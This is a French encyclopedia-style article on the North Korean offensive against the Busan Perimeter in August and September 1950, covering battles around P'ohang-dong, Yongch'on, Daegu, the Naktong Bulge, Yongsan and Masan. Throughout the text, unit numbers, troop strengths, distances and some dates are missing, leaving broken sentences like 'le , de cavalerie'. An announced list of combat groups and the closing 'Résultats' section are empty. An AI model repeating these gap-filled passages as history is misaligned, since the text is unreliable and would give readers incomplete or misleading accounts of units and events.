L'armée nord-coréenne a été poussée au-delà de ses limites et nombre de ses unités ont été réduites limitant l'efficacité de ses forces à la fin d'août. Les problèmes logistiques ont entravé les Nord-Coréens, qui ont été dévastés par des pénuries de nourriture, d'armes, d'équipements et dans le renouvellement de leurs troupes. À la fin août, le commandement de l'ONU dispose de plus de soldats de combat en Corée que les Nord-coréens, et la supériorité de l'ONU dans les airs et sur la mer creuse un fossé chaque jour plus grand. Les Nord-coréens ont perdu plusieurs centaines de tanks et disposent de moins de 100 tanks au septembre, comparativement aux 600 chars des Américains. À la fin d'août le seul avantage restant aux Nord-coréens est l'initiative, les troupes nord-coréennes ayant conservé un haut moral et assez de provisions pour une offensive à grande échelle.
Lors de la planification de l'offensive, les commandants nord-coréens se rendent compte que toute tentative d'attaque par les flancs des forces de l'ONU est impossible de par l'appui de la marine américaine. Ils choisissent alors de frapper frontalement le périmètre afin de le réduire. Avertis par le renseignement soviétique, les Nord-Coréens sont conscients que les forces de l'ONU se renforcent le long du périmètre de Busan et qu'ils doivent mener une offensive rapidement, ou renoncer à la bataille. L'objectif secondaire est d'encercler Daegu et de détruire les unités américaines et sud-coréennes présentes dans la ville. À cette fin, les unités nord-coréennes prévoient d'abord de couper les lignes d'approvisionnement vers Daegu.
Le 22 août, le leader nord-coréen Kim Il-sung ordonne que la guerre soit terminée au septembre, mais l'ampleur de l'offensive ne le permet pas. Les groupes 1 et 2 doivent commencer leur attaque à 23:30 le 31 août, et les groupes 3, 4 et 5 le 2 septembre à 18h00. Les attaques doivent être étroitement connectées pour submerger les troupes de l'ONU sur chaque point simultanément, empêchant l'ONU de déplacer ses renforts sur chacune des zones de l'attaque. Les Nord-Coréens prévoient principalement des attaques de nuit pour contrecarrer la supériorité aérienne et la puissance de feu naval des Américains. Les généraux nord-coréens pensent que ces attaques nocturnes devraient empêcher les forces de l'ONU de tirer de manière efficace et couterait un grand nombre de victimes à l'ONU par tirs amis.
La grande offensive prend les stratèges et les troupes de l'ONU par surprise. Le 26 août, les troupes de l'ONU pensent qu'elles ont déjà détruit la plupart des troupes qui menacent le périmètre, et prévoient la fin de la guerre pour fin novembre. Les unités sud-coréennes, dans l'intervalle, souffrent d'un faible moral à la suite de leurs échecs à se défendre efficacement jusqu'ici dans le conflit. Par prudence, le lieutenant-général Walker ordonne au major-général John B. Coulter de consolider d'armée sud-coréen dans la zone de P'ohang, qui tombait en morceaux avec le moral bas. Les troupes de l'ONU se préparent pour l'opération Chromite, un assaut amphibie sur le port d'Incheon le 15 septembre et n'anticipent pas une offensive sérieuse des Nord-Coréens avant ce dernier.
Forces en présence.
Les planificateurs nord-coréens agrandissent leur force en prévision de la nouvelle offensive. L'armée, constituée à l'origine de 10 divisions en deux corps, est élargie à 14 divisions avec plusieurs brigades indépendantes. Les nouvelles troupes sont amenées depuis les forces de réserve située en Corée du Nord. Le maréchal Choi Yong-kun sert comme commandant en second de l'armée nord-coréenne, avec le général Kim Chaek commandant le quartier général sur le front. Ils disposent du d'armée situé à l'Est et commandé par le lieutenant général Kim Mu Chong, et du d'armée situé à l'Ouest et commandé par le lieutenant général Kim Ung. Le contrôle les , , , , et divisions ainsi que la blindée, avec la blindée et la de sécurité en soutien. Le commande les , , , , , , et divisions avec la blindée en soutien. Cette force compte environ , même si un tiers se compose de nouvelles recrues forcées et des conscrits sud-coréens, et manque d'armes et d'équipements. Le 31 août, ils sont confrontés à une force de troupes de combat, plus de troupes de soutien des Nations unies.
Le 20 août, le commandement nord-coréen distribue les ordres opérationnels à leurs unités subordonnées. Ces ordres appellent à une attaque simultanée contre les lignes de l'ONU sur cinq zones différentes afin de submerger les défenseurs de l'ONU et de permettre aux Nord-Coréens de percer les lignes et de repousser les forces de l'ONU sur au moins une des zones. Cinq groupes de combat sont constitués comme suit :
L'offensive.
P'ohang-dong et Gyeongju.
La grande offensive nord-coréenne frappe d'abord le flanc droit de l'ONU sur la côte Est de la Corée. Bien que l'attaque générale du dans le Nord et l'Est soit initialement prévue pour le 2 septembre, la nord-coréenne, maintenant forte de , commence à manœuvrer plus tôt que prévu. La division ne dispose que d'un faible approvisionnement alimentaire, en munitions et en armes, et le moral des hommes est faible. Face à la nord-coréenne, la Corée du Sud oppose la division Capitale. À 04h00, le 27 août l'attaque nord-coréenne déborde le de la division Capitale, qui doit battre en retraite abandonnant Kigye aux Nord-coréens. Le à l'Est doit à son tour reculer en raison de l'exposition de son flanc. L'ensemble de la division recule de près de . Walton Walker ordonne alors à Coulter d'aller observer les troupes sud-coréennes dans cette zone. Coulter atterri à 12h à Gyeongju et dans l'intervalle, Walker le nomme officiellement commandant en second de la et le place à la tête de la "Task Force Jackson" composée du sud-coréen qui contrôle la division Capitale et la sud-coréennes, du d'infanterie, du bataillon, , et du de char moyen américain. Coulter a pour mission d'arrêter la pénétration nord-coréenne dans la zone Kigye. Il veut attaquer dès que possible et envoie immédiatement le au nord d'An'gang-ni se positionner derrière la division Capitale. Le plan de Coulter prévoit initialement de lancer la contre-offensive le 28 août, mais il doit la reporter, car le major-général Kim Hong-Il, commandant du , affirme qu'il ne peut pas attaquer, en raison du trop grand nombre de victimes et de l'épuisement de ses troupes.
Dans le même temps, la nord-coréenne pénètre les positions de la sud-coréenne au sud-ouest de P'ohang-dong. Coulter envoie le d'infanterie repousser la pénétration le 29 août, qui contre-attaque avec succès au nord-ouest depuis la pointe sud de P'ohang-dong sur une distance de . Le prend ensuite le relais de la sud-coréenne dans un secteur s'étendant du Nord au nord-ouest de P'ohang-dong. Également le 29 août, la division Capital, avec le soutien de l'artillerie et des chars américains, reprend Kigye, pour la perdre à nouveau le lendemain, alors que les frappes aériennes américaines s'accélèrent dans la zone. La nord-cornéenne entretient la pression au nord de P'ohang-dong, sur la colline 99 en face du sud-coréen. Et malgré le soutien aérien, naval et de l'artillerie américaine, la sud-coréenne et le d'infanterie américain ne sont pas en mesure de capturer la colline. Le 2 septembre à 01h30, la nord-coréenne, frappe la division Capitale sur les hautes collines au sud de la vallée de Kigye, repoussant les et . Le 2 septembre, au crépuscule, les Nord-coréens ont pénétré la ligne de front entre la division capitale et la à à l'est de Kigye. À l'aube du 3 septembre, la percée nord-coréenne atteint la route vitale est-ouest du corridor à à l'est d'An'gang-ni. Au cours de la nuit, la avance encore de alors que la division Capitale s'effondre. Cela force Coulter à retirer le de la ligne nord-ouest de P'ohang-dong pour le redéployer dans les environs de Gyeongju. Dans le même temps, Walker envoie la sud-coréenne vers la percée nord-coréenne. Son sécurise Yongch'on dans l'après-midi, et le prend position à Gyeongju dans la soirée.
Dans la nuit du 3 au 4 septembre, le reste du s'effondre. Les Nord-Coréens prennent An'gang-ni à 02h20 et commencent à s'avancer vers le sud. À 12h00, le 4 septembre, les Nord-coréennes sont à moins de de Gyeongju. Coulter repositionne le américain dans la vallée et les collines au nord-ouest de Gyeongju afin de bloquer toute approche. Dans la nuit du 5 au 6 septembre, la sud-coréennes doit se retirer de P'ohang–dong qui tombe aux mains nord-coréennes. En raison de cette poussée à l'Est, Walker ordonne à la du major-général John H. Church de marcher vers Gyeongju qu'elle atteint le 6 septembre. Le 7 septembre, Coulter ordonne au de lancer une contre-attaque sur la vallée et les collines environnantes au nord-ouest de Gyeongju. Il ne rencontre pratiquement aucune opposition. Ce même jour, la renomme la "Task Force Jackson" en "Task force Church", et Coulter quitte Gyeongju pour Daegu afin de reprendre ses fonctions de planification, laissant Church seul aux commandes du front Est. Dans cette deuxième semaine de septembre, des éléments de la nord-coréenne s'infiltrent sur les collines à l'Ouest et au Sud de P'ohang–dong et à au sud-ouest de l'aérodrome de . Dans la soirée du 9 septembre, Church forme la "Task Force Davidson" sous les ordres du brigadier général Garrison H. Davidson, composée essentiellement du , pour éliminer la menace contre Yonil. Les 11 et 12 septembre, la Task Force reprend les positions au sud-ouest de Yonil. Dans le même temps, la bataille pour la colline 300 débutée une semaine auparavant au nord de Gyeongju touche à sa fin ; la sud-coréenne reprend la colline le 11 septembre. Le 12 septembre, l'offensive nord-coréenne dans l'Est est terminée et la "Task Force Davidson" retourne à Gyeongju le 13 septembre.
Yongch'on.
Dans les hautes montagnes entre Daegu à l'Ouest et le corridor de Gyeongju à l'Est, les et nord-coréennes préparent également une attaque contre Hayang et de Yongch'on pour le septembre afin de couper la route d'approvisionnement entre Daegu et P'ohang-dong. Cette attaque doit se coordonner avec l'offensive nord-coréenne menée dans la zone Kigye-P'ohang. L'objectif de la est Hayang ; l'objectif de la est Yongch'on, que la division a reçu l'ordre de prendre à tout prix. Face aux et divisions nord-coréennes se positionnent respectivement les et sud-coréennes.
En dix jours de combats, la nord-coréenne ne gagne que quelques kilomètres, et au 12 septembre n'a toujours pas pu prendre située à au nord-ouest de Yongch'on. Au 8 septembre, certains des bataillons nord-coréens ne rassemblent déjà plus qu'une vingtaine d'hommes. La sud-coréenne défait de manière décisive la nord-coréenne qui est pratiquement détruite. Sur la route vers l'Est au-dessus de Yongch'on, la lance son attaque contre la sud-coréenne le 2 septembre. Bien qu'en sous-effectif, avec seulement , elle réussit à pénétrer dans le corridor latéral à Yongch'on. Le 6 septembre, des éléments de la division nord-coréenne parviennent jusqu'à Yongch'on et manœuvrent vers les collines au sud et au sud-est de celle-ci donnant sur la route entre Daegu et P'ohang-dong. Le 7 septembre, au cours de la journée, le de la sud-coréenne attaque depuis l'Est, nettoyant Yongch'on avant de prendre une position défensive au nord de la ville. Le 8 septembre, la reprend durant quelques heures Yongch'on, mais dans l'après-midi, le de la sud-coréenne arrive depuis le front de Daegu et reprend définitivement Yongch'on aux Nord-coréens. Cependant, ces derniers tiennent encore la gare ferroviaire au sud-est alors que d'autres unités manœuvrent au Sud-Est sur la route de Gyeongju.
Lors de ce moment critique, la qui a percé à travers la sud-coréenne à Yongch'on, tente de manœuvrer à l'est et au sud afin de prendre la Task Force Jackson à revers ou sur son flanc gauche. Walker ordonne alors aux et ROK de renforcer la depuis deux secteurs très éloignés du front afin de contrer la avant qu'elle puisse exploiter sa percée. Les Sud-Coréens lancent une très violente attaque les 9 et 10 septembre. Ils encerclent et détruisent pratiquement la au sud-est de Yongch'on sur les collines qui bordent la route Kyongju. Le rôle joué par les officiers du KMAG dans le regroupement de la sud-coréenne et la réorganisation de ses unités est un facteur important de cette victoire. Le 10 septembre, la nettoie les dernières positions nord-coréennes sur la route Yongch'on-Gyeongju. Avançant au nord de Yongch'on derrière les survivants de la en retraite, la et le de la ne rencontrent presque aucune résistance. Le 12 septembre, les éléments des deux unités sont à au nord de la ville. Les forces sud-coréennes avancent alors à l'est de Yongch'on et au nord de Kyongju pour fermer la brèche dans leurs lignes.
Daegu.
Tabu-dong.
Pendant que quatre divisions du attaquent dans les zones de P'ohang-dong, Gyeongju, et Yongch'on, les trois autres divisions du , les , et , mènent une attaque convergente sur Daegu. La attaque dans la zone de Waegwan au nord-ouest de Daegu. La descend depuis les montagnes au nord de Daegu, le long et à l'ouest de la route Sangju-Daegu, et la , le long des hautes montagnes juste à l'est de la route. Défendant Daegu, le major-général Hobart R. Gay, commandant de la de cavalerie alerte toutes les unités de première ligne afin qu'elle se prépare à l'attaque. Walton Walker ordonne à la de cavalerie d'attaquer au nord le septembre afin de détourner une partie des forces nord-coréennes des et américaines situées plus au Sud. Gay charge alors le de cavalerie d'attaquer la colline 518 (Suam-san) au nord de la route latérale Waegwan-Tabu-dong à au nord-est de Waegwan et à à l'est du Nakdong. Le , du de cavalerie est chargé lui de mener des attaques de diversion sur le flanc droit du de cavalerie. Le du régiment est situé sur la colline à l'ouest de la Bowling Alley et au nord de Tabu-dong ; le est à cheval sur la route.
Dans la matinée du 2 septembre, l'US Air Force se livre à une frappe de contre les collines 518 et 346 et à 10h00, le du passe à l'attaque. Les lourdes frappes aériennes et la préparation d'artillerie ont cependant échoué à déloger les Nord-Coréens solidement terrés dans la colline 518 Le , puis le échouent à reprendre la colline, les 2, 3 et 4 septembre. Sur la droite, le du de cavalerie, attaque le 4 septembre et prend la colline 303, mais il a de grandes difficultés à tenir face aux contre-attaques de la nord-coréenne. Cette nuit-là, les Nord-coréens percent par l'écart entre le sur la colline 518 et le sur la colline 303 et manœuvrent vers l'Ouest afin d'occuper la colline 464 à l'arrière du . Sur la droite de la division, Tabu-dong est aux mains des Nord-coréens, sur la gauche, Waegwan est un no man's land, et sur le centre, les forces nord-coréennes s'infiltrent en grand nombre au sud de la colline 518. Le de cavalerie court le danger d'être encerclé. En accord avec Walker, Gay ordonne le 5 septembre un retrait général de la de cavalerie au cours de la nuit afin de raccourcir les lignes et d'occuper une meilleure position défensive. La manœuvre de repli débute par le flanc droit et se poursuit à gauche en commençant par le de cavalerie, le de cavalerie dans la région de la colline 518, et enfin la de cavalerie dans la zone Waegwan. Mais les fortes pluies tombées dans la nuit du 5 au 6 septembre ralentissent le retrait et le du se retrouve pratiquement encerclé dans les collines 464 et 380 et sur la gauche de la division, le du subit de lourdes pertes avant d'abandonner la colline 303 aux Nord-Coréens le 6 septembre et de se replier le 7 septembre.
Le bataillon du est rattaché au régiment et le reste du se replie en réserve de la division près de Daegu et dans la nuit du 7 au 8 septembre, le reçoit l'ordre de se replier au Sud de Waegwan à cheval sur la principale autoroute Séoul–Daegu. Pendant ce temps, la nord-coréenne déplace toujours des renforts à travers le Nakdong et le 8, un communiqué nord-coréen revendique la capture de Waegwan. Le 9 septembre, la situation empire pour la de cavalerie. Sur son flanc gauche, la nord-coréenne force le du à se retirer de la colline 345, à à l'est de Waegwan et continue à presser le de cavalerie lors de combats en dents de scie sur les collines 203 et 174. Le du de cavalerie capture finalement cette dernière avant de rejoindre son régiment en reserve. Jusqu'au 15 septembre, le de cavalerie et les Nord-coréens se battent âprement sur une ligne qui évoluent peu à au nord-ouest de Daegu, autour des collines 203, 188 et 174. Cette dernière change de mains à sept reprises. Les différents bataillons du de cavalerie sont si affaiblis à ce moment qu'ils ne sont plus considérés comme efficaces pour le combat.
Ka-san.
Les Nord-coréens frappent également avec force dans la zone de "Bowling Alley" au nord de Daegu. Ils attaquent le du de cavalerie dans la nuit du 2 au 3 septembre sur la colline 448 à l'ouest de la "Bowling Alley" et à au nord de Tabu-dong. Le dépassé se retire relayé par le . Au cours de la journée, des éléments de la nord-coréenne prennent la cité fortifiée de Ka-san sur la crête de la colline 902, à à l'est de Tabu-dong et à au nord de Daegu. Le 3 septembre, le commandement de l'ONU et la des États-Unis accuse donc la perte simultanée de Tabu-dong et de Ka-san. Cette avancée soudaine des Nord-coréens vers le Sud et vers Daegu, inquiète Walker et ce dernier ordonne à la de cavalerie de reprendre et de défendre la colline 902 stratégiquement importante pour la défense de Daegu. La de cavalerie crée également la "Task Force Allen", sous le commandement du général de brigade Frank A. Allen, Jr et chargée d'intervenir au cas où les Nord-coréens perceraient les défenses à l'approche de Daegu.
Le colonel Raymond D. Palmer, commandant du de cavalerie reçoit l'ordre de reprendre la montagne avec l'aide de quelques unités de soutien du génie affectée pour l'occasion à son régiment, notamment la compagnie D du bataillon du génie de combat. Le 4 septembre, la force manœuvre vers Ka-san et la compagnie D du génie lance son attaque sur la montagne vers midi et atteint à 17h le sommet de la colline 755, le bras sud de la colline 902. Là, les Américains subissent les vagues d'assaut nord-coréennes depuis la colline 902 jusqu'au lendemain. Mais avec des pertes élevées et presque à court de munitions, le commandant de la division, Hobart R. Gay ordonne à 13h30 au de retirer ses hommes de Ka-san. Gay pense qu'il ne dispose pas des forces suffisantes pour sécuriser et tenir la colline et que de toute manière les Nord-Coréens n'ont pas assez de munitions pour exploiter cette position comme point d'observation afin d'orienter leurs tirs d'artillerie et de mortier.
Maintenant, avec Ka-san fermement en leur possession, les et divisions nord-coréennes sont prêtes à descendre sur Daegu. Le 6 septembre, les Nord-coréens sont à au Sud de Tabu-dong et d'autres unités occupent la colline 570, à au sud-ouest de Ka-san et à au nord de Daegu. Même si la de cavalerie recule presque partout le 7 septembre, Walker ordonne à cette dernière et au sud-coréen de reprendre la colline 902. Dans la matinée du 8 septembre, le , de cavalerie d'abord est chargé de repousser les Nord-Coréens de la colline 570, car Walker décide de maintenir une pression continue sur le flanc Est du secteur de la , menace la plus immédiate pour les forces de l'ONU sur le périmètre de Busan. Mais, ce même jour, les forces nord-coréennes menacent également les collines 314 et 660 au sud-est de la colline 570, contraignant la de cavalerie à abandonner son offensive contre la colline 570. La nord coréenne manœuvre ensuite vers la zone de la sud-coréenne sur le flanc droit de la de cavalerie. Son avance de depuis l'est de la colline 902 vers l'imposante colline P'algong-san qu'il atteint le 10 septembre. La de cavalerie américaine concentre alors la plupart de ses unités de combat sur son flanc droit au nord de Daegu. Le 11 septembre, les combats au nord de Daegu dans les environs des collines 660 et 314 sont lourds et confus. Dans la journée, la nord-coréenne prend la colline 314 qui doit leur servir d'appui pour la conquête de la cité.
Le 12 septembre, les Américains et les Sud-coréens décident de mener une grande contre-attaque. La sud-coréenne a la mission d'attaquer depuis P'algong-san en direction de Ka-san et le , de cavalerie est chargée de reprendre la colline 314. Au prix de très lourdes pertes, les Américains sécurisent la colline et la tiennent durant les six prochains jours. Après la prise de la colline 314, le 12 septembre, la situation au nord de Daegu s'améliore. Le 14 septembre, le , de cavalerie conquiert une partie de la colline 570 au de la nord-coréenne. Sur la droite, la sud-coréenne poursuit son attaque au nord-ouest et avance jusqu'à Ka-san. À ce moment la majeure partie de la nord-coréenne se retire progressivement de Ka-san et de son voisinage. Et les informations indiquent que la se retire également vers le Nord. Mais le 15 septembre, des combats continuent sans relâche au nord de Daegu. Le , de cavalerie combat toujours pour prendre le contrôle total de la colline 570. De l'autre côté, le , de cavalerie doit frapper la colline 401, où les Nord-coréens ont pénétré l'espace entre le et le de cavalerie.
Nakdong Bulge.
Seconde bataille du Nakdong.
Sur la rive ouest du Nakdong, le major général Pak Kyo Sam, commandant la d'infanterie nord-coréenne, émet ses ordres d'opérations à la division le 28 août. La mission de la est de déborder et de détruire les troupes américaines au "Naktong Bulge" et de capturer les zones de Miryang et de afin de couper la route d'approvisionnement et de retraite entre Daegu et Busan à la d'infanterie américaine. Cependant, les Nord-Coréens ignorent que la a récemment remplacé la d'infanterie sur les positions le long du Nakdong. Par conséquent, ils s'attendent à une résistance plus légère. En effet, les troupes de la sont épuisées par mois de combats, alors que les hommes de la sont arrivés récemment en Corée et viennent d'être envoyés au front.
Dans la nuit du 31 août, de jusqu'à minuit, la d'infanterie nord-coréenne franchit le Nakdong et grimpe les collines vers les positions du d'infanterie américain. À , sur le flanc Sud du , dans la zone de la colline 94 et du village d'Agok les Nord-Coréens commencent à frapper les positions de la compagnie A qui tient jusqu'au lendemain matin. Mais plus au nord, les Nord-Coréens débordent les positions des compagnies C et B qui doivent se replier avec de lourdes pertes. À , le ordonne à sa seule unité de réserve, la compagnie E de prendre une position de blocage dans la passe entre Cloverleaf Hill et Obong-ni Ridge, à de la rivière et à de Yongsan, mais à , les Nord-Coréens surprennent la compagnie qui subit également de lourdes pertes. Avec Cloverleaf Hill et Obong-ni Ridge dans leurs mains, les Nord-Coréens contrôlent maintenant les hauteurs entre Yongsan et le fleuve. De son côté, le d'infanterie tient ses positions au nord du . Son commandant, le colonel Paul L. Freeman déploie le sur les hauteurs le long de la rivière avec trois compagnies côte à côte. Après des tirs d'obus, à , les Nord-Coréens lancent leur attaque contre le bataillon. Débordé sur la gauche le long de la route Pugong-ni-Changnyong, le se replie à à l'exception de la compagnie C bloquée. Freeman est alors contraint de déployer trois compagnies de réserve afin d'établir une position de défense sur les hauteurs de Ponch'o-ri au-dessus du lac Sanorho, devant Changnyong. Mais pendant la nuit, les Nord-Coréens contournent le flanc droit de cette position. Finalement, le du d'infanterie et d'autres unités divers du régiment arrêtent la pénétration à au nord-ouest de Changnyong.
À l'aube, le septembre, Keiser au QG de la estime que sa division est en difficulté. L'attaque massive des Nord-Coréens a réussi une percée de de large et de de profondeur au milieu de la ligne de la division, coupant ainsi la en deux. Keiser décide de réorganiser la division deux forces opérationnelles. Il place le général de brigade Loyal M. Haynes, à la tête du groupe nord, la "Task Force Haynes" et au sud, le général de brigade Joseph S. Bradley prend la tête de la "Task Force Bradley". Keiser espère qu'il pourra organiser une défense le long de la route Changnyong-Yongsan et bloquer l'accès aux Nord-Coréens à la passe menant vers l'est et Miryang. Le général Walker estime également que la situation la plus critique se situe dans la zone du "Naktong Bulge" dans le secteur de la car Miryang est menacée et avec elle, la totalité des positions de la . Il ordonne au général de brigade des Marines Edward A. Craig, commandant de la provisoire, de se tenir prêts à partir pour le "Nakdong Bulge". À 09h00, Walker demande à l'US Air Force de faire un effort maximum le long du Nakdong et d'isoler le champ de bataille afin de prévenir d'autres renforts et couper l'approvisionnement nord-coréen. Sur l'ordre du commandement d'Extrême-Orient, la flotte arrête ses frappes sur la zone Incheon-Séoul afin de filer vers le Sud à pleine vapeur.
La situation est chaotique dans les jours qui suivent. Dans le secteur du d'infanterie, la compagnie A se fait anéantir dans la nuit du au 2. Dans la nuit du 4 au 5 septembre, la Task Force Manchu, composée essentiellement de la compagnies E du d'infanterie, doit abandonner après quatre jours de combats incessants, sa position sur la proéminence sud de la colline 209. Au Nord du , le est également après le septembre, dans une situation très précaire. Le est chassé du fleuve et isolé à à l'ouest de sa position initiale. La division envoie depuis Mosan-ni, le du ouvrir la route au du qu'il rejoint à 17h00 le 2 septembre. Dans la soirée, les Nord-Coréens attaquent en force le sur la colline 209 repoussant une compagnie de sa position. Les Nord-Coréens atteignent les portes de Changnyong dans la soirée du 2 septembre. Keiser ordonne au du d'infanterie d'établir une position défensive à l'ouest de Changnyong. Le 3 septembre, les troupes nord-coréennes lancent une offensive sur la colline 284 qui se termine le 5 septembre quand la compagnie F reprend la colline. Le 4 septembre, Haynes modifie la limite entre le et le d'infanterie, attribuant la partie nord du secteur du au d'infanterie, permettant ainsi au de manœuvrer vers le sud pour aider le à défendre l'approche sud de Changnyong. Le d'infanterie projette de concentrer toutes ses troupes sur les positions occupées par son sur la route Pugong-ni-Changnyong. Le se rend sur place et prend position sur le flanc gauche du . Dans ce périmètre, le d'infanterie mène une série de durs combats. La nord-coréenne procède à une nouvelle attaque contre le périmètre du le 8 septembre afin de percer vers l'Est. Elle enfonce les défenses de la compagnie F alors que l'ensemble du front du régiment risque de tomber. Le 9 septembre, l'US Air Force doit effectuer un fort soutien aérien sur le périmètre du régiment et tous les hommes disponibles sont envoyés au combat, mais l'offensive peut être bloquée vers 12h00. Si ce lourd combat coûte à la nord-coréenne la plupart de ses dernières forces offensives, elle continue à harceler les zones arrière autour de Changnyong pendant plusieurs jours.
Yongsan.
Le matin du septembre, les et de la d'infanterie nord-coréenne se trouvent après la traversée du fleuve et la pénétration des lignes américaines à seulement quelques kilomètres de Yongsan. Avec seulement les restes de la compagnie E, le de la n'a pratiquement aucune troupe pour défendre la cité. Le commandant de la division, le major général Laurence B. Keiser rattache alors le du génie au régiment. Le de chars et la compagnie de reconnaissance de la sont également affectés sur des positions proches de Yongsan. Les Nord-coréens engagent le à environ trois km à l'ouest de Yongsan tout en approchant également la cité par le Sud. Mais dans la nuit du au 2, les soldats nord-coréens franchissent les faibles défenses autour de Yongsan et entrent dans la ville.
Tandis que les Nord-Coréens tentent de détruire les troupes du génie à la lisière sud de Yongsan et de dégager la route vers Miryang le 2 septembre; la provisoire des Marines, sous les ordres du général de brigade Edward A. Craig est autorisée à manœuvrer vers Yongsan Walker rattache provisoirement la brigade des Marines à la et ordonne une attaque coordonnée par tous les éléments disponibles de la division et des Marines, avec la mission de détruire les Nord-Coréens à l'Est du Nakdong dans le secteur de la et de restaurer les lignes sur le fleuve. Les Marines attaquent à 08h00 le 3 septembre à l'ouest, à cheval sur la route Yongsan-Nakdong ; le , la compagnie B du de tank et la batterie D du AAA attaquent au nord-ouest et tentent de rétablir le contact avec le ; et le de génie, les restes du , d'infanterie, et les éléments du de chars attaquent sur le flanc gauche afin de rétablir le contact avec la . La contre-offensive américaine du 3 au 5 septembre à l'ouest de Yongsan donne lieu à l'une des débâcles les plus sanglantes de la guerre pour une division nord-coréenne. Même si les restes de la , soutenue par la faible résistance de la , détiennent toujours Obong-ni Ridge, Cloverleaf Hill, et les voies de retrait vers le Nakdong le 6 septembre, leurs forces offensives sont totalement épuisées à la fin de la contre-attaque américaine. Les et ne sont plus en mesure de reprendre l'offensive.
Masan.
Haman.
À l'extrême ouest, au centre-gauche de la ligne de la , le du du lieutenant-colonel Paul F. Roberts tient les crêtes à à l'ouest d'Haman. À la fin de l'après-midi du 31 août, toutes les unités américaines sur la ligne sont alertées d'une éventuelle attaque nord-coréenne. Dans la soirée, la d'infanterie nord-coréenne frappe la compagnie F sur le côté nord du col de la route Chungan-ni-Haman. Les troupes sud-coréennes présentes au nord du col quittent leurs positions et se replient sur la compagnie G au sud du col. Les Nord-coréens envahissent rapidement la position, et peu de temps après le début de l'offensive, la majeure partie du du d'Infanterie fuit ses positions et se replient vers Haman à l'encontre des ordres de leurs officiers. Les Nord-Coréens traversent rapidement les lignes américaines en ruine et envahissent le poste de commandement du . Haman se retrouve ouverte aux Nord-coréennes qui l'encerclent alors que le s'effondre dans le désarroi. Le commandant du , le colonel ordonne alors au situé à environ au sud de Haman sur la route Chindong-ni de contre-attaquer et de rétablir la ligne. La contre-attaque démarre à 07h30 le septembre, mais le s'effondre à son tour et doit se replier. Alors qu'ils tiennent la ville, la plus grande partie de deux régiments de la nord-coréenne s'engouffre dans la brèche de Haman.
À 14h45 le septembre, Kean ordonne une contre-attaque immédiate pour restaurer les positions du d'infanterie. Pendant les avions e l'US Air Force frappe les positions nord-coréennes autour de Haman avec des bombes, du napalm, des roquettes, et des tirs de mitrailleuses. Ces frappes sont suivies de quinze minutes des tirs d'artillerie concentrés ; des incendies se propagent alors à Haman. Kean dépêche immédiatement le du d'infanterie du lieutenant-colonel Gilbert J. Check vers Haman et le rattache au d'infanterie. Les troupes de Check attaque à l'ouest à 16:30, renforcée par un peloton de chars de la compagnie A du de chars et reprennent la ville facilement, alors que la plupart des troupes nord-coréennes ont abandonné la cité. Les Nord-Coréens tiennent cependant avec vigueur la crête située à l'ouest de la ville, et leurs tirs de mitrailleuse balaient toutes les approches. Toute la journée le 2 septembre, les frappes aériennes harcèlent les Nord-Coréens et les empêchent de se réorganiser pour mener une autre attaque coordonnée. L'aéronavale participe aux frappes sur le champ de bataille de Masan avec ses avions depuis les porte-avions et situé à de distance dans la mer Jaune. Un dur combat s'engage toute la matinée entre les Nord-Coréens et le bataillon de Check, mais à 12h00, le , d'infanterie, peut sécuriser les anciennes positions du , d'infanterie. Lors de la journée du 2 septembre, l'US Air Force a effectué 135 sorties dans le secteur de la d'infanterie. Après l'échec de leur principale offensive, la bataille pour Haman est au point mort. Les Nord-Coréens, en proie à des problèmes de logistique et de main-d'œuvre, préfère axer leurs attaques contre les positions du d'infanterie sur Battle Mountain, ainsi que contre les positions d'infanterie sur la rivière Nam. Les troupes d'infanterie du à Haman ne subissent plus que quelques attaques sporadiques jusqu'au 18 septembre.
Fleuve Nam.
Pendant ce temps, la division nord-coréenne engage toutes ces forces contre la ligne du d'infanterie. Ce dernier qui doit faire face à des pénuries de matériel et de renforts, est sous équipé mais néanmoins préparé à une attaque. À 23h30 le 31 août. l'artillerie nord-coréenne attaque l'ensemble des compagnies du régiment depuis la rive ouest du pont de Namji-ri. Sous le couvert de l'artillerie, un régiment de la traverse la rivière Nam et attaque les compagnies F et G du . Afin de ralentir la traversée, le commandant du régiment, le colonel Henry Fisher place 300 policiers sud-coréens au niveau du site du ferry situé entre le et le bataillon et prépare le à une contre-attaque. Mais à 00h30, les compagnies de police près du ferry se dispersent et les troupes nord-coréennes s'engouffrent par cette brèche.
Au lever du jour, bien que le d'infanterie tient l'ensemble de ses positions d'origine à l'exception de celle du peloton avancé de la compagnie G, nord-coréens ont franchi les lignes. La pénétration la plus profonde atteint les hauteurs juste au sud de Chirwon donnant sur la route nord-sud. Dans l'après-midi, Kean estime que la situation est grave et menace l'intégrité de la ligne de la division. Il ordonne au du d'infanterie d'attaquer derrière le , parce qu'une grande partie de l'artillerie de la division est sous l'attaque directe de l'infanterie nord-coréenne. Durant la matinée du septembre, alors que certaines unités nord-coréens attaquent la compagnie G, d'autres engagent la compagnie E à en aval de cette première, et d'autres encore attaquent des unités dispersées de la compagnie F qui garde le pont de Namji-ri. Là, sur le flanc extrême droit de la américaine, ce peloton réussit à chasser une force nord-coréenne après une lutte acharnée. Le 2 septembre, la compagnie E a détruit la plupart d'un bataillon nord-coréen dans de lourds combats.
Des combats confus continuent derrière la ligne du d'infanterie la semaine suivante. Les bataillons, compagnies et pelotons, coupées et isolées, combattent sans contrôle directs de leurs supérieurs et globalement sans soutien à l'exception des parachutages qui ravitaillent la plupart de ces unités. Mais dans l'ensemble, le combat sur ses positions d'origine. Bien que la soit globalement moins sous la pression des unités nord-coréennes après le 5 septembre, il y a encore des attaques locales sévères. Les fortes pluies entrainent la hausse de la Nam et du Naktong le 8 et le 9 septembre, ce qui réduit le risque de nouvelles traversées des Nord-coréens. Et si des attaques limitées contre le , d'infanterie se poursuivent chaque nuit du 9 au 16 septembre, l'essentiel de l'élan nord-coréen a été brisé et ils ne peuvent pas rassembler suffisamment de forces pour mener à nouveau des attaques d'envergure contre le régiment.
Résultats.
